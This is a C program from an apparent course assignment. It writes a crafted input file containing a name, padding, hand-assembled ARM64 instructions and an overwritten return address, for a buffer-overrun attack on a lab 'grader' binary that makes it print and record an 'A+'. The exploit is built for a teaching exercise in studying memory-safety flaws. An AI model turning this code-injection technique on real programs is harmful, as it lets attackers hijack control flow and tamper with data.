/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"
enum {BUFSIZE = 48};

/*--------------------------------------------------------------------*/


/* Does not accept any command-line arguments or read text from stdin. 
   Writes a sequence of characters to file dataA designed to perform a 
   "A+" buffer overrun attack on the grader executable. The sequence of 
   characters includes the student name, null bytes, and binary code.
   Returns 0. */

int main(void)
{
   unsigned int i;
   unsigned int uiInstr;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   psFile = fopen("dataAplus", "w");
   psName = "Giao";

   /* Writes the student's name to the dataA file */
   for (i = 0; i<strlen(psName); i++){
       fprintf(psFile, "%c", psName[i]);
   }
   fprintf(psFile, "%c", 0x00);
   fprintf(psFile, "%c", '%');
   fprintf(psFile, "%c", 'c');
   fprintf(psFile, "%c", 0x00);

   /* Writes the instruction adr w0, "%c" */
   uiInstr = MiniAssembler_adr(0, 0x42005D, 0x420060);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Writes the instruction mov w0, ‘A’ */
   uiInstr = MiniAssembler_mov(1, 'A');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction bl printf("%c", 'A') */
   uiInstr = MiniAssembler_bl(0x400600, 0x420068);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction mov w0, ‘+’ */
   uiInstr = MiniAssembler_mov(0, '+');
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
   /* Writes the instruction adr x1, grade */
   uiInstr = MiniAssembler_adr(1, 0x420044,
   0x420070);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction strb w0, [x1] */
   uiInstr = MiniAssembler_strb(0,1);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes the instruction b 0x400864 (call of printf) */
   uiInstr = MiniAssembler_b(0x400864, 0x420078);
   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

   /* Writes enough null bytes to the dataAplus file
   to overrun until X30 */
   for (i = 0; i<BUFSIZE-36; i++){
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the address which corresponds to 
   instruction: adr w0, "A" in BSS section */
   ulData = 0x420060;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}